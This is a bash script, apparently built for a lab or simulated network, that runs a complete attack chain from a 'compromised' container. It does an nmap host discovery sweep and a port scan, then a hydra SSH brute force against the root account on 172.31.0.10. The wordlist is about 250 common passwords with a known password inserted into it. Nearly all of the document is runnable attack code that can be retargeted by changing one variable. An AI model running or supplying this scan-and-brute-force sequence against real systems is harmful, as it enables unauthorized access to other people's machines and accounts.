#!/bin/bash

# Attack script for compromised container
# Performs: 1) Network discovery, 2) SSH port discovery, 3) Brute force attack

set -e

# Configuration
SERVER_IP="172.31.0.10"
COMPROMISED_IP="172.30.0.10"
WORDLIST_FILE="/tmp/wordlist.txt"
CORRECT_PASSWORD="admin123"
LOG_FILE="/tmp/attack_log.txt"

# Create a wordlist with 250 passwords including the correct one
create_wordlist() {
    echo "Creating wordlist with 250 passwords..."

    # Common passwords to make up the bulk of the list
    cat > "$WORDLIST_FILE" << 'EOF'
123456
password
qwerty
admin
letmein
welcome
monkey
1234567890
password123
abc123
111111
123123
dragon
master
hello
freedom
whatever
qazwsx
trustno1
123qwe
zxcvbn
sunshine
iloveyou
princess
football
baseball
shadow
superman
michael1
ninja
asdfgh
jessica
lovely
654321
pokemon
slayer
helpme
131313
killer
trustno1
welcome
samantha
matrix
dallas
austin
thunder
tigger
mickey
george
191919
chicago
jordan
liverpool
internet
soccer
harley
nicole
daniel
abgrtyu
merlin
heaven
michael1
ranger
diamond
corvette
ernie
hammer
ferrari
alexander
buster
teddy
sunset
tester
william
patrick
marlboro
scooter
sammy
matrix
kitten
tiger
rabbit
patrick
merlin
chicken
buster
ferrari
diamond
bastian
arturo
ranger
hammer
summer
broncos
cowboys
yankees
jordan
cameron
soccer
football
baseball
tennis
guitar
player
mustang
silver
golden
eagle
warrior
panther
tornado
lightning
thunder
hurricane
volcano
earthquake
tsunami
blizzard
wildfire
avalanche
landslide
explosive
dynamite
nitro
fusion
reactor
plasma
laser
phaser
tractor
bulldozer
excavator
helicopter
airplane
submarine
battleship
aircraft
missile
torpedo
grenade
sniper
assassin
warrior
champion
victory
triumph
conquest
dominion
supremacy
ultimate
infinity
eternal
legendary
mystical
magical
fantastic
wonderful
amazing
incredible
fantastic
extraordinary
spectacular
magnificent
phenomenal
outstanding
remarkable
exceptional
unbelievable
astonishing
breathtaking
awe-inspiring
mind-boggling
earth-shattering
groundbreaking
revolutionary
innovative
cutting-edge
state-of-the-art
advanced
sophisticated
complex
intricate
complicated
challenging
difficult
impossible
unbreakable
invincible
unstoppable
indestructible
immortal
eternal
infinite
limitless
boundless
endless
timeless
ageless
ancient
primeval
prehistoric
medieval
modern
futuristic
advanced
superior
ultimate
extreme
maximum
minimum
optimal
perfect
ideal
flawless
impeccable
pristine
pure
sacred
divine
holy
blessed
cursed
damned
forbidden
taboo
secret
mystery
enigma
puzzle
riddle
challenge
obstacle
barrier
threshold
gateway
portal
 doorway
entrance
exit
escape
freedom
liberty
justice
truth
wisdom
knowledge
power
strength
courage
bravery
honor
glory
fame
fortune
wealth
success
victory
triumph
achievement
accomplishment
fulfillment
satisfaction
happiness
joy
bliss
ecstasy
rapture
paradise
heaven
nirvana
eden
utopia
shangri-la
atlantis
avalon
camelot
elysium
valhalla
olympus
asgard
midgard
niflheim
muspelheim
alfheim
svartalfheim
nidavellir
helheim
jotunheim
vanaheim
EOF

    # Insert the correct password at a random position
    CORRECT_POS=$((1 + RANDOM % 250))
    echo "$CORRECT_PASSWORD" | sed -i "${CORRECT_POS}i $CORRECT_PASSWORD" "$WORDLIST_FILE"

    # Shuffle the wordlist randomly
    shuf "$WORDLIST_FILE" -o "$WORDLIST_FILE"

    echo "Wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
    echo "Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
}

# Log function
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Attack phases
attack_phase_1() {
    log_message "Phase 1: Network discovery - Scanning for hosts in 172.31.0.0/24"
    nmap -sn 172.31.0.0/24 -oN /tmp/nmap_discovery.txt
    log_message "Phase 1 completed"
}

attack_phase_2() {
    log_message "Phase 2: Port scanning - Looking for SSH on server $SERVER_IP"
    nmap -p 22,21,80,443,3389 "$SERVER_IP" -oN /tmp/nmap_ports.txt
    log_message "Phase 2 completed"
}

attack_phase_3() {
    log_message "Phase 3: Brute force attack - Starting SSH brute force on $SERVER_IP:22"
    log_message "Using wordlist with $(wc -l < "$WORDLIST_FILE") passwords"

    # Use hydra for SSH brute force
    hydra -l root -P "$WORDLIST_FILE" ssh://"$SERVER_IP":22 -V -o /tmp/hydra_results.txt

    # Check if attack was successful
    if grep -q "1 valid password found" /tmp/hydra_results.txt; then
        log_message "Phase 3 completed - SUCCESS: Password found!"
        SUCCESS="true"
    else
        log_message "Phase 3 completed - FAILED: No password found"
        SUCCESS="false"
    fi
}

# Main execution
main() {
    log_message "Starting attack sequence from $COMPROMISED_IP targeting $SERVER_IP"
    log_message "Attack started at $(date)"

    # Create wordlist
    create_wordlist

    # Phase 1: Network discovery
    attack_phase_1

    # Wait a bit between phases
    sleep 5

    # Phase 2: Port discovery
    attack_phase_2

    # Wait a bit between phases
    sleep 5

    # Phase 3: Brute force
    attack_phase_3

    log_message "Attack completed at $(date)"
    log_message "Final result: $SUCCESS"

    # Create summary
    cat > /tmp/attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "phases_completed": 3,
    "success": $SUCCESS,
    "wordlist_size": $(wc -l < "$WORDLIST_FILE"),
    "correct_password": "$CORRECT_PASSWORD",
    "log_file": "$LOG_FILE"
}
EOF

    echo "Attack summary saved to /tmp/attack_summary.json"
}

# Initialize variables
ATTACK_ID="${1:-$(date +%s)}"
START_TIME="$(date -Iseconds)"
SUCCESS="false"

# Run the attack
main "$@"